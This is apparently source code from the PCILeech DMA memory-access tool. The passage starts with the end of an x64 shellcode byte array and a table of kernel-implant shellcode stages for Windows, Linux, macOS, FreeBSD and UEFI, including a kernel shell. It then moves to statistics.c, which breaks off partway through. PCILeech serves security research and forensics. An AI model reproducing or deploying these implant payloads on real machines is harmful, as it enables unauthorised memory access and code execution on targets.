    0x84, 0x5f, 0x61, 0x64, 0x64, 0xc7, 0x45, 0x88, 0x69, 0x6f, 0x76, 0x00,
    0xc7, 0x44, 0x24, 0x50, 0x5f, 0x75, 0x69, 0x6f, 0xc7, 0x44, 0x24, 0x54,
    0x5f, 0x72, 0x65, 0x73, 0x66, 0xc7, 0x44, 0x24, 0x58, 0x69, 0x64, 0x44,
    0x88, 0x7c, 0x24, 0x5a, 0xc7, 0x45, 0xd0, 0x5f, 0x76, 0x66, 0x73, 0xc7,
    0x45, 0xd4, 0x5f, 0x63, 0x6f, 0x6e, 0xc7, 0x45, 0xd8, 0x74, 0x65, 0x78,
    0x74, 0xc7, 0x45, 0xdc, 0x5f, 0x63, 0x75, 0x72, 0xc7, 0x45, 0xe0, 0x72,
    0x65, 0x6e, 0x74, 0x44, 0x88, 0x7d, 0xe4, 0xc7, 0x45, 0x90, 0x5f, 0x75,
    0x69, 0x6f, 0xc7, 0x45, 0x94, 0x5f, 0x63, 0x72, 0x65, 0xc7, 0x45, 0x98,
    0x61, 0x74, 0x65, 0x00, 0xc7, 0x44, 0x24, 0x20, 0x5f, 0x75, 0x69, 0x6f,
    0xc7, 0x44, 0x24, 0x24, 0x5f, 0x66, 0x72, 0x65, 0x66, 0xc7, 0x44, 0x24,
    0x28, 0x65, 0x00, 0x48, 0x8d, 0x75, 0x00, 0x41, 0x8b, 0xff, 0x48, 0x2b,
    0xf2, 0x48, 0x8b, 0x14, 0x1e, 0x49, 0x8b, 0x4e, 0x08, 0xe8, 0x13, 0xfd,
    0xff, 0xff, 0x48, 0x89, 0x03, 0x48, 0x85, 0xc0, 0x74, 0x12, 0x48, 0xff,
    0xc7, 0x48, 0x83, 0xc3, 0x08, 0x48, 0x83, 0xff, 0x0d, 0x72, 0xde, 0xb8,
    0x01, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0x70, 0x01, 0x00, 0x00,
    0x49, 0x8b, 0x5b, 0x20, 0x49, 0x8b, 0x73, 0x28, 0x49, 0x8b, 0x7b, 0x30,
    0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc,
    0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48,
    0x83, 0xec, 0x40, 0x48, 0x8b, 0x4a, 0x50, 0x49, 0x8b, 0xd8, 0x48, 0x83,
    0x64, 0x24, 0x58, 0x00, 0x48, 0x8b, 0xfa, 0xe8, 0x1d, 0xfd, 0xff, 0xff,
    0x48, 0x8b, 0x4f, 0x18, 0x48, 0x8d, 0x53, 0x18, 0x48, 0x89, 0x44, 0x24,
    0x30, 0x48, 0x8b, 0xf0, 0x48, 0x8d, 0x44, 0x24, 0x58, 0x41, 0xb9, 0xff,
    0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x41, 0xb8, 0x01, 0x06,
    0x00, 0x00, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0xe8, 0xec, 0xfc, 0xff,
    0xff, 0x33, 0xdb, 0xb9, 0x02, 0x00, 0x00, 0xf0, 0x48, 0x85, 0xc0, 0x0f,
    0x45, 0xd9, 0x48, 0x8b, 0x54, 0x24, 0x58, 0x48, 0x85, 0xd2, 0x74, 0x12,
    0x48, 0x8b, 0x4f, 0x20, 0x4c, 0x8b, 0xce, 0x41, 0xb8, 0x00, 0x00, 0x01,
    0x00, 0xe8, 0xc3, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x8b,
    0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3,
    0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x55, 0x56,
    0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xac,
    0x24, 0x50, 0xfe, 0xff, 0xff, 0x48, 0x81, 0xec, 0xb0, 0x02, 0x00, 0x00,
    0x49, 0x8b, 0xf8, 0x4c, 0x8b, 0xf2, 0x45, 0x33, 0xc0, 0x4c, 0x8b, 0xf9,
    0x48, 0x81, 0xb9, 0x10, 0x02, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x41,
    0x8b, 0xd8, 0x89, 0x9d, 0x08, 0x02, 0x00, 0x00, 0x41, 0x8b, 0xf0, 0x4c,
    0x89, 0x44, 0x24, 0x50, 0x4c, 0x89, 0x44, 0x24, 0x58, 0x73, 0x0a, 0xbb,
    0x07, 0x00, 0x00, 0xf0, 0xe9, 0x8d, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x4a,
    0x50, 0xe8, 0x4b, 0xfc, 0xff, 0xff, 0x49, 0x8b, 0x0e, 0x48, 0x8d, 0x57,
    0x18, 0x4c, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x45, 0x80, 0x45, 0x33,
    0xc0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8b, 0xe0, 0xe8, 0x2b, 0xfc,
    0xff, 0xff, 0x45, 0x33, 0xc0, 0x48, 0x85, 0xc0, 0x74, 0x0a, 0xbb, 0x02,
    0x00, 0x00, 0xf0, 0xe9, 0x3c, 0x03, 0x00, 0x00, 0x49, 0x8b, 0x8f, 0x48,
    0x03, 0x00, 0x00, 0x48, 0x8d, 0x55, 0xa0, 0x41, 0xb9, 0x10, 0x02, 0x00,
    0x00, 0xe8, 0x03, 0xfc, 0xff, 0xff, 0x49, 0x8b, 0x8f, 0x48, 0x03, 0x00,
    0x00, 0x48, 0x8d, 0x55, 0x88, 0x41, 0xb9, 0x18, 0x00, 0x00, 0x00, 0x45,
    0x33, 0xc0, 0xe8, 0xea, 0xfb, 0xff, 0xff, 0x49, 0x8b, 0x8f, 0x08, 0x02,
    0x00, 0x00, 0xb8, 0x05, 0x00, 0x00, 0x00, 0x49, 0x03, 0x4f, 0x28, 0x41,
    0xb9, 0x00, 0x00, 0x01, 0x00, 0x49, 0x8b, 0xbf, 0x10, 0x02, 0x00, 0x00,
    0x45, 0x33, 0xc0, 0x21, 0x9d, 0xf0, 0x01, 0x00, 0x00, 0x48, 0x81, 0xc7,
    0x00, 0x00, 0xff, 0xff, 0x48, 0x03, 0xf9, 0x66, 0x89, 0x45, 0x88, 0x49,
    0x8b, 0x8f, 0x48, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xd7, 0xc7, 0x45, 0x8c,
    0x09, 0x16, 0x00, 0x80, 0xc7, 0x45, 0x98, 0x02, 0x00, 0x00, 0x00, 0xc7,
    0x45, 0x94, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x7c, 0x24, 0x60, 0xe8,
    0x8d, 0xfb, 0xff, 0xff, 0x48, 0x21, 0x5c, 0x24, 0x20, 0x45, 0x33, 0xc0,
    0xe9, 0x4e, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x54, 0x24, 0x50, 0x48, 0x8d,
    0x85, 0xf0, 0x01, 0x00, 0x00, 0x49, 0x8b, 0x4e, 0x38, 0x4c, 0x8d, 0x4d,
    0xa0, 0x4c, 0x89, 0x64, 0x24, 0x48, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48,
    0x8d, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4c, 0x89, 0x44,
    0x24, 0x30, 0x4c, 0x89, 0x44, 0x24, 0x28, 0x4c, 0x8d, 0x45, 0x88, 0x4c,
    0x89, 0x6c, 0x24, 0x20, 0xe8, 0x40, 0xfb, 0xff, 0xff, 0x45, 0x33, 0xc0,
    0x48, 0x85, 0xc0, 0x0f, 0x85, 0x3e, 0x02, 0x00, 0x00, 0x8b, 0x85, 0xf0,
    0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x83, 0x02, 0x00, 0x00, 0x8b,
    0xd0, 0x48, 0x03, 0xc6, 0x48, 0x8d, 0x0c, 0xc0, 0x49, 0x8b, 0x87, 0x10,
    0x02, 0x00, 0x00, 0x48, 0x2d, 0x00, 0x00, 0x01, 0x00, 0x48, 0xc1, 0xe1,
    0x06, 0x48, 0x3b, 0xc1, 0x0f, 0x82, 0x60, 0x02, 0x00, 0x00, 0x48, 0x85,
    0xd2, 0x0f, 0x84, 0x65, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x74, 0x24, 0x60,
    0x4c, 0x8d, 0x24, 0xf6, 0x49, 0xc1, 0xe4, 0x06, 0x41, 0x8b, 0xd8, 0xbe,
    0x03, 0x01, 0x00, 0x00, 0x49, 0xbd, 0x00, 0x91, 0x10, 0xb6, 0x02, 0x00,
    0x00, 0x00, 0x49, 0x8b, 0xbf, 0x08, 0x02, 0x00, 0x00, 0x41, 0xb9, 0x40,
    0x02, 0x00, 0x00, 0x49, 0x03, 0x7f, 0x28, 0x45, 0x33, 0xc0, 0x49, 0x8b,
    0x8f, 0x48, 0x03, 0x00, 0x00, 0x49, 0x03, 0xfc, 0x48, 0x8b, 0xd7, 0xe8,
    0xb5, 0xfa, 0xff, 0xff, 0x41, 0x8b, 0x06, 0x49, 0x8b, 0xd6, 0x4c, 0x03,
    0xf0, 0x4c, 0x8d, 0x4a, 0x04, 0x48, 0x83, 0xc2, 0x18, 0x41, 0x8b, 0x01,
    0xa8, 0x01, 0x74, 0x39, 0x4c, 0x8b, 0xda, 0x48, 0x83, 0xc2, 0x08, 0x41,
    0x8b, 0x4b, 0x04, 0x48, 0x3b, 0xce, 0x48, 0x0f, 0x47, 0xce, 0x45, 0x33,
    0xc0, 0x48, 0x85, 0xc9, 0x74, 0x1f, 0x4c, 0x8d, 0x57, 0x38, 0x41, 0x8b,
    0x03, 0x49, 0x03, 0xc0, 0x49, 0xff, 0xc0, 0x42, 0x0f, 0xb6, 0x04, 0x18,
    0x66, 0x41, 0x89, 0x02, 0x4d, 0x8d, 0x52, 0x02, 0x4c, 0x3b, 0xc1, 0x72,
    0xe5, 0x41, 0x8b, 0x01, 0xa8, 0x08, 0x74, 0x2b, 0x8b, 0x02, 0x48, 0x83,
    0xc2, 0x04, 0x83, 0xf8, 0x01, 0x75, 0x06, 0x48, 0x83, 0x0f, 0x01, 0xeb,
    0x1a, 0x83, 0xf8, 0x02, 0x75, 0x06, 0x48, 0x83, 0x0f, 0x02, 0xeb, 0x0f,
    0x83, 0xf8, 0x05, 0x75, 0x06, 0x48, 0x83, 0x0f, 0x04, 0xeb, 0x04, 0x48,
    0x83, 0x0f, 0x08, 0x41, 0xf7, 0x01, 0x00, 0x02, 0x00, 0x00, 0x74, 0x15,
    0x48, 0x8b, 0x0a, 0x48, 0x83, 0xc2, 0x10, 0x49, 0x03, 0xcd, 0x48, 0x69,
    0xc1, 0x80, 0x96, 0x98, 0x00, 0x48, 0x89, 0x47, 0x18, 0x41, 0xf7, 0x01,
    0x00, 0x04, 0x00, 0x00, 0x74, 0x15, 0x48, 0x8b, 0x0a, 0x48, 0x83, 0xc2,
    0x10, 0x49, 0x03, 0xcd, 0x48, 0x69, 0xc1, 0x80, 0x96, 0x98, 0x00, 0x48,
    0x89, 0x47, 0x10, 0x41, 0xf7, 0x01, 0x00, 0x10, 0x00, 0x00, 0x74, 0x15,
    0x48, 0x8b, 0x0a, 0x48, 0x83, 0xc2, 0x10, 0x49, 0x03, 0xcd, 0x48, 0x69,
    0xc1, 0x80, 0x96, 0x98, 0x00, 0x48, 0x89, 0x47, 0x08, 0x41, 0x8b, 0x41,
    0x0c, 0xa8, 0x02, 0x74, 0x07, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x47, 0x30,
    0x8b, 0x85, 0xf0, 0x01, 0x00, 0x00, 0x48, 0xff, 0xc3, 0x49, 0x81, 0xc4,
    0x40, 0x02, 0x00, 0x00, 0x48, 0x3b, 0xd8, 0x0f, 0x82, 0xd5, 0xfe, 0xff,
    0xff, 0x8b, 0x9d, 0x08, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x74, 0x24, 0x58,
    0x4c, 0x8b, 0xb5, 0xf8, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x6c, 0x24, 0x68,
    0x4c, 0x8b, 0x65, 0x80, 0x49, 0x8b, 0x4e, 0x60, 0x49, 0x8b, 0xd5, 0xe8,
    0x89, 0xf9, 0xff, 0xff, 0x8b, 0x85, 0xf0, 0x01, 0x00, 0x00, 0x41, 0xb9,
    0x00, 0x00, 0x01, 0x00, 0x49, 0x8b, 0x8f, 0x08, 0x02, 0x00, 0x00, 0x48,
    0x03, 0xf0, 0x49, 0x03, 0x4f, 0x28, 0x45, 0x33, 0xc0, 0x49, 0x8b, 0xbf,
    0x10, 0x02, 0x00, 0x00, 0x83, 0xa5, 0xf0, 0x01, 0x00, 0x00, 0x00, 0x48,
    0x81, 0xc7, 0x00, 0x00, 0xff, 0xff, 0x48, 0x03, 0xf9, 0x48, 0x89, 0x74,
    0x24, 0x58, 0x49, 0x8b, 0x8f, 0x48, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xd7,
    0x48, 0x89, 0x7c, 0x24, 0x60, 0xe8, 0x3b, 0xf9, 0xff, 0xff, 0x48, 0x83,
    0x64, 0x24, 0x20, 0x00, 0x4c, 0x8b, 0xc6, 0x49, 0x8b, 0x4e, 0x58, 0x41,
    0xb9, 0x02, 0x00, 0x00, 0x00, 0x41, 0x8d, 0x51, 0xff, 0xe8, 0x1f, 0xf9,
    0xff, 0xff, 0x49, 0x8b, 0x4e, 0x40, 0x41, 0xb9, 0x00, 0x00, 0x01, 0x00,
    0x4c, 0x8b, 0xc7, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8b, 0xd0, 0x4c,
    0x8b, 0xe8, 0xe8, 0x02, 0xf9, 0xff, 0xff, 0x45, 0x33, 0xc0, 0x48, 0x85,
    0xc0, 0x0f, 0x84, 0x76, 0xfd, 0xff, 0xff, 0xbb, 0x02, 0x00, 0x00, 0xf0,
    0x4d, 0x85, 0xed, 0x74, 0x0f, 0x49, 0x8b, 0x4e, 0x60, 0x49, 0x8b, 0xd5,
    0xe8, 0xe0, 0xf8, 0xff, 0xff, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0x54, 0x24,
    0x50, 0x48, 0x85, 0xd2, 0x74, 0x0c, 0x49, 0x8b, 0x4e, 0x08, 0xe8, 0xca,
    0xf8, 0xff, 0xff, 0x45, 0x33, 0xc0, 0x48, 0x85, 0xf6, 0x41, 0x0f, 0x45,
    0xd8, 0x8b, 0xc3, 0x48, 0x8b, 0x9c, 0x24, 0x00, 0x03, 0x00, 0x00, 0x48,
    0x81, 0xc4, 0xb0, 0x02, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d,
    0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0x48, 0x8d, 0x04, 0xf6, 0x48, 0xc1,
    0xe0, 0x06, 0x49, 0x89, 0x87, 0x00, 0x02, 0x00, 0x00, 0xeb, 0xa1, 0xcc,
    0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57,
    0x41, 0x56, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xe9, 0x33, 0xdb, 0x48,
    0x8b, 0x4a, 0x50, 0x49, 0x8b, 0xf0, 0x48, 0x21, 0x5c, 0x24, 0x58, 0x48,
    0x8b, 0xfa, 0xe8, 0x66, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0x0f, 0x48, 0x8d,
    0x56, 0x18, 0x4c, 0x8d, 0x4c, 0x24, 0x58, 0x48, 0x89, 0x44, 0x24, 0x20,
    0x45, 0x33, 0xc0, 0x4c, 0x8b, 0xf0, 0xe8, 0x4a, 0xf8, 0xff, 0xff, 0x48,
    0x85, 0xc0, 0x74, 0x0a, 0xbb, 0x02, 0x00, 0x00, 0xf0, 0xe9, 0x98, 0x00,
    0x00, 0x00, 0x4c, 0x8b, 0x86, 0x28, 0x03, 0x00, 0x00, 0x41, 0xb9, 0x02,
    0x00, 0x00, 0x00, 0x48, 0x8b, 0x4f, 0x58, 0x48, 0x21, 0x5c, 0x24, 0x20,
    0x41, 0x8d, 0x51, 0xff, 0xe8, 0x1c, 0xf8, 0xff, 0xff, 0x4c, 0x8b, 0x85,
    0x08, 0x02, 0x00, 0x00, 0x48, 0x8b, 0xd0, 0x4c, 0x03, 0x45, 0x28, 0x48,
    0x8b, 0xf0, 0x4c, 0x8b, 0x8d, 0x10, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x4f,
    0x40, 0xe8, 0xfb, 0xf7, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x07, 0xbb,
    0x02, 0x00, 0x00, 0xf0, 0xeb, 0x3b, 0x48, 0x8b, 0x54, 0x24, 0x58, 0x45,
    0x33, 0xc9, 0x48, 0x8b, 0x4f, 0x28, 0x4c, 0x8b, 0xc6, 0x4c, 0x89, 0x74,
    0x24, 0x20, 0xe8, 0xd6, 0xf7, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0xdb,
    0x48, 0x8b, 0x4f, 0x48, 0x48, 0x8b, 0xd6, 0xe8, 0xc5, 0xf7, 0xff, 0xff,
    0x48, 0x8b, 0x8d, 0x10, 0x02, 0x00, 0x00, 0x48, 0x2b, 0xc8, 0x48, 0x89,
    0x8d, 0x00, 0x02, 0x00, 0x00, 0x48, 0x85, 0xf6, 0x74, 0x0c, 0x48, 0x8b,
    0x4f, 0x60, 0x48, 0x8b, 0xd6, 0xe8, 0xa3, 0xf7, 0xff, 0xff, 0x48, 0x8b,
    0x54, 0x24, 0x58, 0x48, 0x85, 0xd2, 0x74, 0x09, 0x48, 0x8b, 0x4f, 0x08,
    0xe8, 0x90, 0xf7, 0xff, 0xff, 0x48, 0x8b, 0x6c, 0x24, 0x60, 0x8b, 0xc3,
    0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5e, 0x5f,
    0x5e, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48,
    0x89, 0x68, 0x18, 0x48, 0x89, 0x70, 0x20, 0x57, 0x41, 0x56, 0x41, 0x57,
    0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x4a, 0x50, 0x33, 0xdb, 0x48, 0x21,
    0x58, 0x10, 0x49, 0x8b, 0xe8, 0x49, 0x8b, 0x40, 0x10, 0x48, 0x8b, 0xfa,
    0x4c, 0x8b, 0xf8, 0x48, 0xc1, 0xe8, 0x04, 0x49, 0xc1, 0xe7, 0x04, 0x83,
    0xe0, 0x08, 0x41, 0x81, 0xe7, 0x00, 0x04, 0x00, 0x00, 0x4c, 0x0b, 0xf8,
    0x49, 0x83, 0xcf, 0x01, 0xe8, 0x2c, 0xf7, 0xff, 0xff, 0x48, 0x8b, 0x4f,
    0x18, 0x48, 0x8d, 0x55, 0x18, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8b,
    0xf0, 0x48, 0x8d, 0x44, 0x24, 0x68, 0x45, 0x33, 0xc9, 0x48, 0x89, 0x44,
    0x24, 0x28, 0x4d, 0x8b, 0xc7, 0x48, 0x21, 0x5c, 0x24, 0x20, 0xe8, 0x02,
    0xf7, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x0a, 0xbb, 0x02, 0x00, 0x00,
    0xf0, 0xe9, 0xa5, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00,
    0x00, 0x41, 0xb9, 0x02, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4f, 0x58, 0xc7,
    0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x41, 0x8d, 0x51, 0xff, 0xe8,
    0xd1, 0xf6, 0xff, 0xff, 0x4c, 0x8b, 0x8d, 0x30, 0x03, 0x00, 0x00, 0x4c,
    0x8d, 0x85, 0x38, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x4f, 0x40, 0x48, 0x8b,
    0xd0, 0x48, 0x8b, 0xf0, 0xe8, 0xb4, 0xf6, 0xff, 0xff, 0x48, 0x85, 0xc0,
    0x74, 0x07, 0xbb, 0x02, 0x00, 0x00, 0xf0, 0xeb, 0x49, 0x48, 0x8b, 0x54,
    0x24, 0x68, 0x45, 0x33, 0xc9, 0x48, 0x8b, 0x4f, 0x30, 0x4c, 0x8b, 0xc6,
    0x4c, 0x89, 0x74, 0x24, 0x20, 0xe8, 0x8f, 0xf6, 0xff, 0xff, 0x48, 0x85,
    0xc0, 0x75, 0xdb, 0x49, 0x0f, 0xba, 0xe7, 0x0a, 0x73, 0x24, 0x4c, 0x8b,
    0x85, 0x28, 0x03, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x4c, 0x03, 0x85, 0x30,
    0x03, 0x00, 0x00, 0x48, 0x8b, 0x54, 0x24, 0x68, 0x48, 0x8b, 0x4f, 0x10,
    0x4c, 0x89, 0x74, 0x24, 0x20, 0xe8, 0x5f, 0xf6, 0xff, 0xff, 0x48, 0x85,
    0xf6, 0x74, 0x0c, 0x48, 0x8b, 0x4f, 0x60, 0x48, 0x8b, 0xd6, 0xe8, 0x4e,
    0xf6, 0xff, 0xff, 0x48, 0x8b, 0x54, 0x24, 0x68, 0x48, 0x85, 0xd2, 0x74,
    0x12, 0x48, 0x8b, 0x4f, 0x20, 0x4d, 0x8b, 0xce, 0x41, 0xb8, 0x00, 0x00,
    0x01, 0x00, 0xe8, 0x32, 0xf6, 0xff, 0xff, 0x48, 0x8b, 0x6c, 0x24, 0x70,
    0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x74, 0x24, 0x78,
    0x48, 0x83, 0xc4, 0x40, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0xc3, 0xcc, 0xcc,
    0x40, 0x53, 0x48, 0x81, 0xec, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x54,
    0x24, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x6e, 0xf6, 0xff, 0xff, 0x85, 0xc0,
    0x75, 0x0a, 0xb8, 0x01, 0x00, 0x00, 0xf0, 0xe9, 0x9a, 0x00, 0x00, 0x00,
    0x4c, 0x8b, 0x83, 0x08, 0x01, 0x00, 0x00, 0x4c, 0x03, 0x43, 0x28, 0x48,
    0x81, 0xbb, 0x00, 0x01, 0x00, 0x00, 0x38, 0x03, 0x00, 0x00, 0x72, 0x7d,
    0x48, 0xb8, 0x0f, 0x13, 0xaa, 0x93, 0xad, 0x20, 0xe7, 0x79, 0x49, 0x39,
    0x00, 0x75, 0x6e, 0x41, 0xf6, 0x40, 0x10, 0x10, 0x75, 0x67, 0x49, 0x8b,
    0x40, 0x08, 0x48, 0x83, 0xf8, 0x01, 0x75, 0x11, 0x48, 0x8d, 0x54, 0x24,
    0x20, 0x48, 0x8b, 0xcb, 0xe8, 0xfb, 0xf8, 0xff, 0xff, 0x8b, 0xc0, 0xeb,
    0x51, 0x48, 0x83, 0xf8, 0x03, 0x75, 0x0f, 0x48, 0x8d, 0x54, 0x24, 0x20,
    0x48, 0x8b, 0xcb, 0xe8, 0x04, 0xfd, 0xff, 0xff, 0xeb, 0xe7, 0x48, 0x83,
    0xf8, 0x02, 0x75, 0x0f, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb,
    0xe8, 0x07, 0xfe, 0xff, 0xff, 0xeb, 0xd2, 0x48, 0x83, 0xf8, 0x04, 0x75,
    0x0f, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0x2a, 0xf8,
    0xff, 0xff, 0xeb, 0xbd, 0x48, 0x83, 0xf8, 0x05, 0x75, 0x13, 0xb8, 0x0b,
    0x00, 0x00, 0xf0, 0xeb, 0x05, 0xb8, 0x06, 0x00, 0x00, 0xf0, 0x48, 0x89,
    0x83, 0x20, 0x02, 0x00, 0x00, 0x48, 0x81, 0xc4, 0x90, 0x00, 0x00, 0x00,
    0x5b, 0xc3, 0x00
};

const SHELLCODE_DEFAULT_STRUCT SHELLCODE_DEFAULT[] = {
    {.sz = "DEFAULT_WINX64_STAGE1",.pb = (PBYTE)WINX64_STAGE1_BIN,.cb = sizeof(WINX64_STAGE1_BIN)},
    {.sz = "DEFAULT_WINX64_STAGE2",.pb = (PBYTE)WINX64_STAGE2_BIN,.cb = sizeof(WINX64_STAGE2_BIN)},
    {.sz = "DEFAULT_WINX64_STAGE3",.pb = (PBYTE)WINX64_STAGE3_BIN,.cb = sizeof(WINX64_STAGE3_BIN)},
    {.sz = "DEFAULT_WINX64_STAGE2_HAL",.pb = (PBYTE)WINX64_STAGE2_HAL_BIN,.cb = sizeof(WINX64_STAGE2_HAL_BIN)},
    {.sz = "DEFAULT_WINX64_STAGE23_VMM",.pb = (PBYTE)WINX64_STAGE23_VMM,.cb = sizeof(WINX64_STAGE23_VMM) },
    {.sz = "DEFAULT_WINX64_STAGE23_VMM3",.pb = (PBYTE)WINX64_STAGE23_VMM3,.cb = sizeof(WINX64_STAGE23_VMM3) },
    {.sz = "DEFAULT_WINX64_VFS_KSH",.pb = (PBYTE)WINX64_VFS_KSH,.cb = sizeof(WINX64_VFS_KSH)},
    {.sz = "DEFAULT_WINX64_UMD_EXEC",.pb = (PBYTE)WINX64_UMD_EXEC,.cb = sizeof(WINX64_UMD_EXEC)},
    {.sz = "DEFAULT_LINUX_X64_STAGE1",.pb = (PBYTE)LINUX_X64_STAGE1_BIN,.cb = sizeof(LINUX_X64_STAGE1_BIN)},
    {.sz = "DEFAULT_LINUX_X64_STAGE2",.pb = (PBYTE)LINUX_X64_STAGE2_BIN,.cb = sizeof(LINUX_X64_STAGE2_BIN)},
    {.sz = "DEFAULT_LINUX_X64_STAGE3",.pb = (PBYTE)LINUX_X64_STAGE3_BIN,.cb = sizeof(LINUX_X64_STAGE3_BIN)},
    {.sz = "DEFAULT_LINUX_X64_STAGE2_EFI",.pb = (PBYTE)LINUX_X64_STAGE2_EFI_BIN,.cb = sizeof(LINUX_X64_STAGE2_EFI_BIN)},
    {.sz = "DEFAULT_LINUX_X64_VFS_KSH",.pb = (PBYTE)LINUX_X64_VFS_KSH,.cb = sizeof(LINUX_X64_VFS_KSH)},
    {.sz = "DEFAULT_MACOS_STAGE1",.pb = (PBYTE)MACOS_STAGE1_BIN,.cb = sizeof(MACOS_STAGE1_BIN)},
    {.sz = "DEFAULT_MACOS_STAGE2",.pb = (PBYTE)MACOS_STAGE2_BIN,.cb = sizeof(MACOS_STAGE2_BIN)},
    {.sz = "DEFAULT_MACOS_STAGE3",.pb = (PBYTE)MACOS_STAGE3_BIN,.cb = sizeof(MACOS_STAGE3_BIN)},
    {.sz = "DEFAULT_MACOS_VFS_KSH",.pb = (PBYTE)MACOS_VFS_KSH,.cb = sizeof(MACOS_VFS_KSH)},
    {.sz = "DEFAULT_FREEBSD_X64_STAGE1",.pb = (PBYTE)FREEBSD_X64_STAGE1_BIN,.cb = sizeof(FREEBSD_X64_STAGE1_BIN)},
    {.sz = "DEFAULT_FREEBSD_X64_STAGE2",.pb = (PBYTE)FREEBSD_X64_STAGE2_BIN,.cb = sizeof(FREEBSD_X64_STAGE2_BIN)},
    {.sz = "DEFAULT_FREEBSD_X64_STAGE3",.pb = (PBYTE)FREEBSD_X64_STAGE3_BIN,.cb = sizeof(FREEBSD_X64_STAGE3_BIN)},
    {.sz = "DEFAULT_UEFI_X64",.pb = (PBYTE)UEFI_X64_BIN,.cb = sizeof(UEFI_X64_BIN) },
};

#endif /* __SHELLCODE_H__ */

```

`pcileech/statistics.c`:

```c
// statistics.c : implementation of statistics related functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "statistics.h"
#include "oscompatibility.h"

VOID _PageStatPrintMemMap(_Inout_ PPAGE_STATISTICS ps)
{
    QWORD i, qwAddrEnd;
    if(!ps->i.fIsFirstPrintCompleted) {
        printf(" Memory Map:                                     \n START              END               #PAGES   \n");
    }
    if(!ps->i.MemMapIdx) {
        printf("                                                 \n                                                 \n");
        return;
    }
    if(ps->i.MemMapIdx >= PAGE_STATISTICS_MEM_MAP_MAX_ENTRY - 2) {
        printf(" Maximum number of memory map entries reached.   \n                                                 \n");
        return;
    }
    for(i = max(1, ps->i.MemMapPrintIdx); i <= ps->i.MemMapIdx; i++) {
        if(!ps->i.MemMap[i].cPages) {
            break;
        }
        qwAddrEnd = ps->i.MemMap[i].qwAddrBase + ((QWORD)ps->i.MemMap[i].cPages << 12);
        printf(
            " %016llx - %016llx  %08x   \n",
            ps->i.MemMap[i].qwAddrBase,
            qwAddrEnd - 1,
            ps->i.MemMap[i].cPages);
    }
    ps->i.MemMapPrintIdx = ps->i.MemMapIdx;
    if(!ps->i.MemMap[1].cPages) { // print extra line for formatting reasons.
        printf(" (No memory successfully read yet)               \n");
    }
    printf("                                                 \n");
}

VOID _PageStatShowUpdate(_Inout_ PPAGE_STATISTICS ps)
{
    if(0 == ps->cPageTotal) { return; }
    QWORD qwPercentTotal = ((ps->cPageSuccess + ps->cPageFail) * 100) / ps->cPageTotal;
    QWORD qwPercentSuccess = (ps->cPageSuccess * 200 + 1) / (ps->cPageTotal * 2);
    QWORD qwPercentFail = (ps->cPageFail * 200 + 1) / (ps->cPageTotal * 2);
    QWORD qwTickCountElapsed = GetTickCount64() - ps->i.qwTickCountStart;
    QWORD qwSpeed = ((ps->cPageSuccess + ps->cPageFail) * 4) / (1 + (qwTickCountElapsed / 1000));
    HANDLE hConsole;
